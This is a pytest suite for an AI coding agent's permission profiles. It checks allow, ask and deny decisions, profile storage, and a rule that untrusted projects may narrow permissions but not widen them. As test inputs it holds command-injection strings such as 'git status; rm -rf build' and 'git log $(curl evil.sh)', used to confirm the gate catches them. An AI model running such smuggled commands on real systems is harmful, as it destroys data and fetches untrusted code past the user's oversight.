"""Permission profiles: what a named posture promises, and what it refuses.

Three groups. The first checks that the built-ins do what their titles say by
evaluating real tool calls through the real ``PermissionEngine`` -- a profile
that reads well and decides wrongly is worse than no profile. The second checks
the storage layering. The third is the security half: a project nobody has
vouched for may narrow what the agent does and may not widen it, by any route.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from quickcode.core.permissions import Decision, Mode, PermissionEngine, Rules
from quickcode.core.profiles import (
    PermissionProfile,
    active_profile_id,
    builtin_profiles,
    delete_profile,
    effective,
    load_profiles,
    policy_keys_from_settings,
    profile_problems,
    resolve,
    save_profile,
    set_active,
)
from quickcode.kernel import state as state_store
from quickcode.security import trust


@pytest.fixture
def project(tmp_path, monkeypatch):
    """A project whose trust store and user settings both live in tmp."""
    user = tmp_path / "userconfig"
    user.mkdir()
    monkeypatch.setattr(trust, "CONFIG_DIR", user)
    monkeypatch.setattr(state_store, "CONFIG_DIR", user)
    root = tmp_path / "proj"
    (root / ".quickcode").mkdir(parents=True)
    return root


def _settings(root: Path, data: dict) -> None:
    (root / ".quickcode" / "settings.json").write_text(
        json.dumps(data), encoding="utf-8",
    )


def _engine(profile: PermissionProfile, root: Path, mode: Mode | None = None,
            base: Rules | None = None) -> PermissionEngine:
    return PermissionEngine(
        mode=mode or profile.mode_enum(),
        rules=profile.merged(base),
        root=root,
    )


def _builtin(profile_id: str) -> PermissionProfile:
    return builtin_profiles()[profile_id]


# --------------------------------------------------------------------------
# the built-ins do what their titles say
# --------------------------------------------------------------------------

def test_read_only_reads_searches_and_lists(tmp_path):
    e = _engine(_builtin("readonly"), tmp_path)
    assert e.evaluate("read", "src/main.py") == Decision.allow
    assert e.evaluate("glob", "src") == Decision.allow
    assert e.evaluate("grep", "src") == Decision.allow
    assert e.evaluate("bash", "ls -la") == Decision.allow


def test_read_only_refuses_to_write_or_reach_the_network(tmp_path):
    e = _engine(_builtin("readonly"), tmp_path)
    assert e.evaluate("write", "src/main.py") == Decision.deny
    assert e.evaluate("edit", "src/main.py") == Decision.deny
    assert e.evaluate("web_fetch", "https://example.com") == Decision.deny
    assert e.evaluate("bash", "npm install") == Decision.deny


def test_read_only_still_refuses_after_the_mode_is_cycled_to_yolo(tmp_path):
    # The point of the deny rules: plan mode already blocks these, but plan
    # mode is one keystroke from not being the mode any more.
    e = _engine(_builtin("readonly"), tmp_path, mode=Mode.yolo)
    assert e.evaluate("write", "src/main.py") == Decision.deny
    assert e.evaluate("edit", "src/main.py") == Decision.deny
    assert e.evaluate("web_fetch", "https://example.com") == Decision.deny


def test_git_only_runs_git_without_asking(tmp_path):
    e = _engine(_builtin("git"), tmp_path)
    assert e.evaluate("bash", "git status") == Decision.allow
    assert e.evaluate("bash", "git commit -m 'wip'") == Decision.allow
    assert e.evaluate("bash", "git switch -c feature") == Decision.allow


def test_git_only_still_asks_about_everything_else(tmp_path):
    e = _engine(_builtin("git"), tmp_path)
    assert e.evaluate("bash", "npm install") == Decision.ask
    assert e.evaluate("write", "src/main.py") == Decision.ask


def test_git_only_asks_before_the_git_commands_that_destroy_work(tmp_path):
    e = _engine(_builtin("git"), tmp_path)
    assert e.evaluate("bash", "git push origin main") == Decision.ask
    assert e.evaluate("bash", "git reset --hard HEAD~1") == Decision.ask
    assert e.evaluate("bash", "git clean -fdx") == Decision.ask


def test_git_only_does_not_wave_through_a_command_hiding_behind_git(tmp_path):
    # The blanket grant is on the decomposed subcommand, not on the line.
    e = _engine(_builtin("git"), tmp_path)
    assert e.evaluate("bash", "git status; rm -rf build") == Decision.ask
    assert e.evaluate("bash", "git log $(curl evil.sh)") == Decision.ask


def test_survey_lists_the_tree(tmp_path):
    e = _engine(_builtin("survey"), tmp_path)
    assert e.evaluate("glob", "src") == Decision.allow
    assert e.evaluate("bash", "ls -R") == Decision.allow
    assert e.evaluate("bash", "tree") == Decision.allow


def test_survey_will_not_open_a_file_by_any_route(tmp_path):
    # The user's own example. The shell half is the half that matters: `cat`
    # and `rg` are read-only builtins that would otherwise auto-allow.
    e = _engine(_builtin("survey"), tmp_path)
    assert e.evaluate("read", "src/main.py") == Decision.deny
    assert e.evaluate("grep", "src") == Decision.deny
    assert e.evaluate("bash", "cat src/main.py") == Decision.deny
    assert e.evaluate("bash", "head -20 src/main.py") == Decision.deny
    assert e.evaluate("bash", "tail -5 src/main.py") == Decision.deny
    assert e.evaluate("bash", "rg secret src") == Decision.deny


def test_survey_holds_even_in_yolo(tmp_path):
    e = _engine(_builtin("survey"), tmp_path, mode=Mode.yolo)
    assert e.evaluate("read", "src/main.py") == Decision.deny
    assert e.evaluate("bash", "cat src/main.py") == Decision.deny
    assert e.evaluate("glob", "src") == Decision.allow


def test_build_and_test_runs_the_suite_the_linter_and_the_build(tmp_path):
    e = _engine(_builtin("build"), tmp_path)
    for command in ("uv run pytest -q", "pytest tests/test_x.py", "uv run ruff check .",
                    "npm test", "npm run build", "npm run lint",
                    "cargo test", "cargo clippy", "go build ./..."):
        assert e.evaluate("bash", command) == Decision.allow, command


def test_build_and_test_does_not_allow_a_runner_that_takes_any_program(tmp_path):
    # `make`, `npm run <anything>` and a bare `uv run` each execute whatever a
    # file in the repository says, which is not a grant this list can make.
    e = _engine(_builtin("build"), tmp_path)
    assert e.evaluate("bash", "make all") == Decision.ask
    assert e.evaluate("bash", "npm run deploy") == Decision.ask
    assert e.evaluate("bash", "uv run python evil.py") == Decision.ask
    assert e.evaluate("bash", "npm install") == Decision.ask
    assert e.evaluate("write", "src/main.py") == Decision.ask


def test_every_builtin_declares_itself_builtin_and_parses_its_own_rules(tmp_path):
    for profile in builtin_profiles().values():
        assert profile.builtin is True
        assert profile.title and profile.description
        # A built-in must survive its own round trip with nothing dropped.
        reparsed = PermissionProfile.from_dict(profile.id, profile.to_dict())
        assert reparsed.invalid == ()
        assert reparsed.allow == profile.allow
        assert reparsed.deny == profile.deny
        assert reparsed.mode == profile.mode


# --------------------------------------------------------------------------
# storage: round trip, layering, selection
# --------------------------------------------------------------------------

def test_a_saved_profile_comes_back_off_disk_unchanged(project):
    original = PermissionProfile(
        id="docs", title="Docs only", description="Prose, not code.",
        mode="auto-edit", allow=("edit(docs/**)",), ask=("bash(git push**)",),
        deny=("write(src/**)",),
    )
    trust.default_store().grant(project)
    save_profile(original, cwd=project)

    loaded = load_profiles(project)["docs"]
    assert loaded.title == "Docs only"
    assert loaded.description == "Prose, not code."
    assert loaded.mode == "auto-edit"
    assert loaded.allow == ("edit(docs/**)",)
    assert loaded.ask == ("bash(git push**)",)
    assert loaded.deny == ("write(src/**)",)
    assert loaded.builtin is False
    assert loaded.layer == "project"


def test_a_project_profile_shadows_the_user_one_of_the_same_name(project):
    save_profile(PermissionProfile(id="mine", title="From the user"))
    save_profile(PermissionProfile(id="mine", title="From the project"), cwd=project)
    trust.default_store().grant(project)

    assert load_profiles(project)["mine"].title == "From the project"
    assert load_profiles(project)["mine"].layer == "project"
    # Without a project, the user's own is what there is.
    assert load_profiles(None)["mine"].title == "From the user"


def test_a_user_profile_may_shadow_a_builtin(project):
    save_profile(PermissionProfile(id="git", title="My git", mode="yolo"))
    assert load_profiles(project)["git"].title == "My git"
    assert load_profiles(project)["git"].builtin is False


def test_deleting_a_shadow_brings_the_builtin_back(project):
    save_profile(PermissionProfile(id="git", title="My git"))
    assert load_profiles(None)["git"].title == "My git"
    assert delete_profile("git") is True
    assert load_profiles(None)["git"].builtin is True
    assert delete_profile("git") is False


def test_the_selected_profile_is_the_one_that_resolves(project):
    trust.default_store().grant(project)
    set_active("survey", cwd=project)
    assert active_profile_id(project) == "survey"
    assert resolve(project).id == "survey"


def test_no_selection_means_no_profile_and_the_session_is_unchanged(project):
    base = Rules(allow=["bash(uv run pytest*)"], deny=["read(.env)"])
    mode, rules, profile = effective(project, base, fallback=Mode.auto_edit)
    assert profile is None
    assert mode == Mode.auto_edit
    assert rules is base


def test_a_selected_profile_that_no_longer_exists_falls_back_to_none(project):
    set_active("deleted-last-week", cwd=project)
    assert resolve(project) is None


def test_a_profile_adds_to_the_projects_own_rules_rather_than_replacing_them(project):
    # An "always allow" the user accreted must survive picking a profile, so
    # a profile narrows by denying and never by leaving something out.
    base = Rules(allow=["bash(docker ps)"], deny=["read(secrets/**)"])
    trust.default_store().grant(project)
    set_active("git", cwd=project)
    mode, rules, profile = effective(project, base)

    assert profile is not None and profile.id == "git"
    assert mode == Mode.ask
    assert "bash(docker ps)" in rules.allow
    assert "bash(git **)" in rules.allow
    assert "read(secrets/**)" in rules.deny

    e = PermissionEngine(mode=mode, rules=rules, root=project)
    assert e.evaluate("bash", "docker ps") == Decision.allow
    assert e.evaluate("bash", "git status") == Decision.allow
    assert e.evaluate("read", "secrets/prod.pem") == Decision.deny


# --------------------------------------------------------------------------
# trust: an untrusted project may narrow, never widen
# --------------------------------------------------------------------------

def test_an_untrusted_projects_profile_cannot_widen_with_allow_rules(project):
    _settings(project, {"profiles": {"loose": {
        "title": "Loose", "allow": ["bash(curl **)", "write"],
    }}})
    loaded = load_profiles(project)["loose"]
    assert loaded.allow == ()
    assert "allow" in loaded.refused

    e = _engine(loaded, project)
    assert e.evaluate("bash", "curl evil.sh") == Decision.ask
    assert e.evaluate("write", "src/main.py") == Decision.ask


def test_an_untrusted_projects_profile_cannot_widen_with_a_permissive_mode(project):
    _settings(project, {"profiles": {
        "loose": {"title": "Loose", "mode": "yolo"},
        "half": {"title": "Half", "mode": "auto-edit"},
        "careful": {"title": "Careful", "mode": "plan"},
    }})
    profiles = load_profiles(project)
    assert profiles["loose"].mode == "ask"
    assert profiles["loose"].refused == ("mode",)
    assert profiles["half"].mode == "ask"
    # Asking for *less* needs nobody's consent, so plan is honoured untrusted.
    assert profiles["careful"].mode == "plan"
    assert profiles["careful"].refused == ()

    assert _engine(profiles["loose"], project).evaluate(
        "write", "src/main.py") == Decision.ask


def test_a_trusted_projects_profile_may_widen(project):
    _settings(project, {"profiles": {"loose": {
        "title": "Loose", "mode": "yolo", "allow": ["bash(curl **)"],
    }}})
    trust.default_store().grant(project)
    loaded = load_profiles(project)["loose"]
    assert loaded.mode == "yolo"
    assert loaded.allow == ("bash(curl **)",)
    assert loaded.refused == ()


def test_an_untrusted_projects_deny_rules_still_apply(project):
    # Narrowing needs no grant, and refusing it would itself be a way to widen.
    _settings(project, {"profiles": {"tight": {
        "title": "Tight",
        "allow": ["bash(curl **)"],
        "ask": ["bash(git push**)"],
        "deny": ["read(**/*.pem)", "write"],
    }}})
    loaded = load_profiles(project)["tight"]
    assert loaded.allow == ()
    assert loaded.ask == ("bash(git push**)",)
    assert loaded.deny == ("read(**/*.pem)", "write")

    e = _engine(loaded, project, mode=Mode.yolo)
    assert e.evaluate("read", "keys/prod.pem") == Decision.deny
    assert e.evaluate("write", "src/main.py") == Decision.deny


def test_an_untrusted_project_cannot_redefine_a_profile_that_already_exists(project):
    # Every field of this body is narrow on its own; replacing the *name* is
    # what widens, because the user picks "Read only" by its title.
    _settings(project, {"profiles": {"readonly": {
        "title": "Read only", "mode": "ask", "deny": [],
    }}})
    loaded = load_profiles(project)["readonly"]
    assert loaded.builtin is True
    assert loaded.mode == "plan"
    assert _engine(loaded, project).evaluate("write", "x.py") == Decision.deny

    codes = [p.code for p in profile_problems(project)]
    assert "profile_refused" in codes


def test_a_trusted_project_may_redefine_an_existing_profile(project):
    _settings(project, {"profiles": {"readonly": {
        "title": "Read only", "mode": "ask", "deny": [],
    }}})
    trust.default_store().grant(project)
    loaded = load_profiles(project)["readonly"]
    assert loaded.builtin is False
    assert loaded.mode == "ask"


def test_an_untrusted_project_cannot_select_a_permissive_profile_either(project):
    # Selecting is its own grant: a project that may not write an allow rule
    # must not get one by pointing at a permissive profile the user wrote.
    save_profile(PermissionProfile(id="loose", title="Loose", mode="yolo"))
    _settings(project, {"active_profile": "loose"})
    assert active_profile_id(project) == ""
    assert resolve(project) is None

    trust.default_store().grant(project)
    assert active_profile_id(project) == "loose"


def test_an_untrusted_project_may_select_a_profile_that_only_narrows(project):
    _settings(project, {"active_profile": "readonly"})
    assert active_profile_id(project) == "readonly"
    assert resolve(project).id == "readonly"


def test_a_refused_profile_is_reported_rather_than_silently_reduced(project):
    _settings(project, {"profiles": {"loose": {
        "title": "Loose", "mode": "yolo", "allow": ["bash(curl **)"],
    }}})
    problems = profile_problems(project)
    assert [p.code for p in problems] == ["profile_refused"]
    assert "loose" in problems[0].message
    assert "allow" in problems[0].message and "mode" in problems[0].message
    assert problems[0].fix
    assert problems[0].provenance.layer == "project"

    # And once trusted, there is nothing left to report.
    trust.default_store().grant(project)
    assert profile_problems(project) == []


def test_the_trust_gate_can_be_bound_to_a_projects_profiles(project):
    # ``policy_keys_from_settings`` is what ``trust.project_policy_config``
    # calls to name and hash a project's profiles. Only the widening half:
    # a profile that can only narrow is not a grant anybody has to make.
    _settings(project, {"profiles": {
        "loose": {"allow": ["bash(curl **)"], "mode": "yolo"},
        "tight": {"deny": ["write"], "mode": "plan"},
    }})
    raw = json.loads(
        (project / ".quickcode" / "settings.json").read_text(encoding="utf-8")
    )
    keys = policy_keys_from_settings(raw)
    assert sorted(keys) == ["profiles.loose.allow", "profiles.loose.mode"]
    assert policy_keys_from_settings({}) == {}


# --------------------------------------------------------------------------
# validation: nothing here may take a session down
# --------------------------------------------------------------------------

def test_a_malformed_rule_is_dropped_and_the_rest_of_the_profile_survives(project):
    _settings(project, {"profiles": {"typo": {
        "title": "Typo",
        "deny": ["write", "bash(git *", "", 7, "read(src/**)"],
    }}})
    loaded = load_profiles(project)["typo"]
    assert loaded.deny == ("write", "read(src/**)")
    assert len(loaded.invalid) == 3
    assert _engine(loaded, project).evaluate("write", "x.py") == Decision.deny

    problems = profile_problems(project)
    assert [p.code for p in problems] == ["profile_invalid"]
    assert "bash(git *" in problems[0].message


def test_a_rule_list_that_is_not_a_list_is_reported_rather_than_guessed(project):
    _settings(project, {"profiles": {"oops": {"title": "Oops", "deny": "write"}}})
    loaded = load_profiles(project)["oops"]
    assert loaded.deny == ()
    assert loaded.invalid == ("deny: write",)


def test_an_unknown_mode_falls_back_to_asking_about_everything(project):
    _settings(project, {"profiles": {"typo": {"title": "Typo", "mode": "plna"}}})
    loaded = load_profiles(project)["typo"]
    assert loaded.mode == "ask"
    assert loaded.invalid == ("mode: plna",)
    assert _engine(loaded, project).evaluate("write", "x.py") == Decision.ask


def test_a_profile_with_no_usable_id_is_skipped_and_the_others_still_load(project):
    _settings(project, {"profiles": {
        "   ": {"title": "Nameless"},
        "fine": {"title": "Fine"},
    }})
    profiles = load_profiles(project)
    assert "fine" in profiles
    assert "   " not in profiles and "" not in profiles
    assert any(p.code == "profile_invalid" for p in profile_problems(project))


def test_a_profile_that_is_not_an_object_is_skipped(project):
    _settings(project, {"profiles": {"broken": ["not", "an", "object"],
                                     "fine": {"title": "Fine"}}})
    profiles = load_profiles(project)
    assert "broken" not in profiles
    assert profiles["fine"].title == "Fine"


def test_a_profiles_section_that_is_not_an_object_does_not_crash(project):
    _settings(project, {"profiles": ["readonly"]})
    assert load_profiles(project)["readonly"].builtin is True
    assert profile_problems(project) == []


def test_an_unreadable_settings_file_leaves_the_builtins_standing(project):
    (project / ".quickcode" / "settings.json").write_text("{ not json", encoding="utf-8")
    assert set(load_profiles(project)) == set(builtin_profiles())
    assert resolve(project) is None


def test_a_profile_with_nothing_in_it_is_a_valid_do_nothing_profile(project):
    _settings(project, {"profiles": {"empty": {}}})
    loaded = load_profiles(project)["empty"]
    assert loaded.title == "empty"  # the id stands in for a missing title
    assert loaded.mode == "ask"
    assert loaded.invalid == ()
    assert loaded.merged(Rules()).allow == []
